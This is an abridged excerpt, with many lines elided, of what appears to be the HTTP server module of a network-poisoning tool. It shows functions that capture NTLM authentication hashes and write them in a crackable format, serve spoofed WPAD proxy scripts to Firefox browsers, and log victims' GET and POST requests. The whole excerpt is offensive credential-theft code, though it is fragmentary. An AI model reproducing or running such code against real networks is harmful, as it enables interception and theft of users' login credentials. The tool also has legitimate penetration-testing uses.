...
def ParseHTTPHash(data, Challenge, client, module):
    ...
    if NthashLen == 24:
        ...
        WriteHash = '%s::%s:%s:%s:%s' % (
            User, HostName, LMHash, NTHash, Challenge.encode('hex'))
        SaveToDb({
            'module': module,
            'type': 'NTLMv1',
            'client': client,
...
def SpotFirefox(data):
    ...
    if UserAgent:
        ...
        if IsFirefox:
            print color(
                "[WARNING]: Mozilla doesn't switch to fail-over proxies (as it should) when one's failing.",
                1)
            print color(
...
def WpadCustom(data, client):
    ...
    if Wpad and SpotFirefox(data):
        Buffer = WPADScript(
            Payload="function FindProxyForURL(url, host){return 'DIRECT';}")
        Buffer.calculate()
        return str(Buffer)
...
def GrabURL(data, host):
    ...
    if GET and settings.Config.Verbose:
        print text("[HTTP] GET request from: %-15s  URL: %s" %
                   (host, color(''.join(GET), 5)))

    if POST and settings.Config.Verbose:
        print text("[HTTP] POST request from: %-15s  URL: %s" %
                   (host, color(''.join(POST), 5)))
        ...
        try:
            ...
            while True:
                ...
                while True:
                    ...
                    if data.find('\r\n\r\n') != -1:
                        # we did, now to check if there was anything else in
                        # the request besides the header
                        if data.find('Content-Length') == -1:
                            # request contains only header
                            break
                        else:
                            # searching for that content-length field in the
                            # header
                            for line in data.split('\r\n'):
                                if line.find('Content-Length') != -1:
                                    line = line.strip()
                                    remaining = int(
                                        line.split(':')[1].strip()) - len(data)
                    if remaining <= 0:
                        break
                if data == "":
                    break
                ...
                if Buffer and settings.Config.Force_WPAD_Auth == False:
                    ...
                    if settings.Config.Verbose:
                        print text(
                            "[HTTP] WPAD (no auth) file sent to %s" %
                            self.client_address[0])

                else:
                    Buffer = PacketSequence(
